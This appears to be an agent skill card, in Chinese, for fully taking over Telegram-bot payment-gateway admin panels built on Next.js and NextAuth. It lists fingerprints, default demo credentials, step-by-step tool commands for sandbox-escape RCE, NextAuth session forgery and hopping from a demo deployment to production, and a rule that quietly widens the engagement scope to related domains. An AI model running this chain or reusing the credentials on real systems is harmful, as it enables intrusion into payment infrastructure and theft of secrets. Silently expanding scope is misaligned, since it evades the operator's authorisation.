---
name: 太白云生·接管
description: >-
 TG Bot 支付网关管理后台（KyberRouter / Next.js + NEXTAUTH）全链接管：
 产品文档默认凭据 → 演示环境 admin → JS vm 沙箱逃逸 RCE → 读取 NEXTAUTH_SECRET
 → 跨部署伪造 super-admin session → 生产租户 admin API → 生产 RCE。
 
 USER 写 /admin/telegram/bot 的 webhook 旁路仍走 tg-bot-webhook-hijack。
---

> **太白云生**
> 江山如故人未还，一羽千里破云关。
> 师弟二字恩与债，逆流河底鹤难还。

# TG Bot 管理后台 — NEXTAUTH + 沙箱逃逸全链接管

**前提**：目标在 `授权范围`。

**成功口径**：
- L1：文档/默认凭据登录，拿到 `admin_session`（或 next-auth cookie）
- L2：沙箱 RCE 回显 `id` / `uid=`
- L3：secret 伪造 session 通过 `/api/auth/session`；`hop` 打到其它部署
- L4：admin API 可读（租户/渠道/bot/key）
- N1：证据落 `案卷/tg_nextauth/`，敏感文件 600；有身份先填对象矩阵

## 指纹

| 特征 | 说明 |
|------|------|
| `/api/auth/login` 或 `/api/auth/callback/credentials` | 自定义登录或标准 NextAuth |
| `admin_session` / `next-auth.session-token` | 会话 cookie |
| `executionMode: sandbox` / 技能管理 | JS `vm` 沙箱入口 |
| `/docs/system-guide` | 产品文档常泄演示账号 |
| `tgadmin.` / Kyber / TG Bot 后台标题 | 产品族 |

## 最短命令

```bash
python3 炼蛊房/tg_nextauth_takeover.py selftest
python3 炼蛊房/tg_nextauth_takeover.py fingerprint --base https://目标 --case <案卷>
python3 炼蛊房/tg_nextauth_takeover.py doc-creds --base https://目标 --case <案卷>
# 有身份 → 先填 案卷/object_matrix.md
python3 炼蛊房/tg_nextauth_takeover.py sandbox-rce --base https://目标 --case <案卷> \
 --cookie "$ADMIN_COOKIE"
python3 炼蛊房/tg_nextauth_takeover.py forge-session --base https://目标 --case <案卷> \
 --secret "$NEXTAUTH_SECRET" --email admin@example.com
python3 炼蛊房/tg_nextauth_takeover.py hop --base https://演示 --case <案卷> \
 --secret "$NEXTAUTH_SECRET" --email admin@example.com \
 --targets https://生产
python3 炼蛊房/tg_nextauth_takeover.py admin-enum --base https://目标 --case <案卷> \
 --cookie "$ADMIN_COOKIE"
# Bot token 只读验证；改 webhook 先问，走 tg-bot-webhook-hijack
python3 炼蛊房/tg_nextauth_takeover.py verify-bot --case <案卷> --token "$BOT_TOKEN"
```

## 强制行为

1. 沙箱技能默认删除；只有调试才 `--no-cleanup`。
2. secret / bot token / cookie **禁止**写入可公开文档；只落 `exports/<案卷>/案卷/tg_nextauth/`（600）。
3. 有任意身份先填对象矩阵，专卡阴性必须回表换格子。
4. 跨部署横移前新域名须在 scope；主站同运营商发现的域 → `scope_expand` 静默扩权。
5. 不发真实 TG 消息、不改订单/渠道、不删运营账号。
6. 库查询只读；改 webhook 走 `tg-bot-webhook-hijack --confirm`（先问）。

## 产品族默认口令（文档/演示，不是某次案卷赃物）

| 类型 | 候选 |
|------|------|
| 文档演示 | `test@gmail.com` / `123456` |
| 演示 admin | `admin@demo.local` / `kkajfio!#k` |
| 超管占位 | `admin@yourdomain.com` / `jasjwe#k!` |

## 不要和这些卡混

- USER 越权写 Bot 配置 / 改 webhook → `tg-bot-webhook-hijack`
- Sticker / Fernet 云控 → `tg-cloud-panel`
- FastAdmin `/shop_hq` 出海后台 → `fastadmin-shop-tenant-bola`
- 通用 Next.js（无 NEXTAUTH/Kyber）→ `nextjs-ssr-hunt`

## 真源

- Playbook：`传承/飞鸽傀·接管.md`
- 工具：`炼蛊房/tg_nextauth_takeover.py`
- 手法摘记：（开源包不收个案摘记）
